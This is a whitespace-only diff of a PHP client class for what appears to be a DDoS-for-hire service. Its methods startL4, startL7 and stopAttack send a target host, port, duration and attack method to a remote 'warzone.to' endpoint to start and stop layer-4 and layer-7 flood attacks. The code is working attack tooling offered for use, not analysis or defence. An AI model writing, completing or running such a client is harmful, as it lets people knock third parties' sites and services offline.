@@ -10,9 +10,9 @@
 class API {
 
 	/**
- 	* @param int $userID
+	* @param int $userID
 	* @param string $key
- 	*/
+	*/
 
 	private $userID;
 	private $key;   
@@ -42,7 +42,7 @@ class API {
 	* @param int $time
 	* @param string $method
 	* @return string
- 	*/
+	*/
 
 	public function startL4($host, $port, $time, $method){
 		$postdata = [
@@ -56,28 +56,28 @@ class API {
 	}
 
 	/**
- 	* @param string $host
+	* @param string $host
 	* @param int $time
 	* @param string $method
 	* @param string $requesttype
 	* @param string $ratelimit
 	* @return string
- 	*/
+	*/
 
 	public function startL7($host, $time, $method){
 		$postdata = [
 			'host' => $host,
 			'time' => $time,
-            'method' => $method,
-            'layer' => '7',
+			'method' => $method,
+			'layer' => '7',
 		];
 		return $this->send($postdata, "start");
 	}
 
 	/**
- 	* @param string $host
+	* @param string $host
 	* @return string
- 	*/
+	*/
 
 	public function stopAttack($host){
 		$postdata = [
@@ -89,10 +89,10 @@ class API {
 	}
 
 	/**
- 	* @param array $parameters
+	* @param array $parameters
 	* @param string $action
 	* @return string
- 	*/
+	*/
 
 	private function send(array $parameters = [], $action){
 		$api_url = "https://warzone.to/v1/" . $action . ".php";
@@ -114,7 +114,7 @@ class API {
 				return curl_error($this->curl_handle);
 			default:
                 return $response;
-                $response = json_decode($response, true);
+				$response = json_decode($response, true);
 				return $response;
 		}
 	}
